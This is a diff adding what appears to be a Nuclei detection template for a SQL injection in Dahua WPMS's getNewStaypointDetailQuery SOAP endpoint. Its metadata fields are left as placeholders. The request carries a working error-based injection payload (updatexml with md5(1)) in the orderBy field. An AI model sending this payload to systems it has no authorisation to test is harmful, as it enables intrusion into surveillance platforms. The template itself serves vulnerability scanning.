@@ -1,0 +1,35 @@
+id: dahua-wpms-getNewStaypointDetailQuery-sqli
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |
+        POST /portal/services/carQuery/getNewStaypointDetailQuery HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:car="http://carQuery.webservice.dssc.dahua.com">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <car:getNewStaypointDetailQuery>
+        <!--type: string-->
+        <searchJson>{}</searchJson>
+        <!--type: string-->
+        <pageJson>{"orderBy":"1 and 1=updatexml(1,concat(0x7e,(select md5(1)),0x7e),1)--"}</pageJson>
+        <!--type: string-->
+        <extend>quae divum incedo</extend>
+        </car:getNewStaypointDetailQuery>
+        </soapenv:Body>
+        </soapenv:Envelope>
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b923820dcc509a6f75849'
